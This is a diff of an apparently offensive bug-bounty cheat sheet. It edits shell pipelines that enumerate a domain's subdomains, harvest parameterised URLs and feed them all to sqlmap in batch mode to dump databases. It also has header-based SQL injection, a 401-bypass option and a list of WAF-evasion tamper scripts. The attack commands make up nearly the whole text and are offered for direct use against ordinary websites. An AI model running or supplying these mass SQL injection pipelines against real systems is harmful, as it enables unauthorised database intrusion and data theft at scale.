@@ -125,13 +125,13 @@ $ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 ```sh
 // **MASS SQL injection**
 $ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
-$ cat domain.txt | gauplus -random-agent -t 200 | gf sqli | tee domain2.txt
+$ cat domain.txt | gau -t 200 | gf sqli | tee domain2.txt
 $ sqlmap -m domain2.txt -dbs --batch --random-agent
-$ subfinder -dL domains.txt | dnsx | waybackurl | uro  | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+$ subfinder -dL domain.txt | dnsx | waybackurl | uro  | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
 // **SQL Injection headers**
-$ sqlmap -u "http://redacted.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10
+$ sqlmap -u "http://example.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10
 // **SQL Injection bypass 401**
-$ sqlmap -u "http://redacted.com" --dbs --batch --random-agent --forms --ignore-code=401
+$ sqlmap -u "http://example.com" --dbs --batch --random-agent --forms --ignore-code=401
 
 // PRO TIPS FOR BYPASSING WAF, add to SQLmap this tamper
 --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,space2comment,randomcase
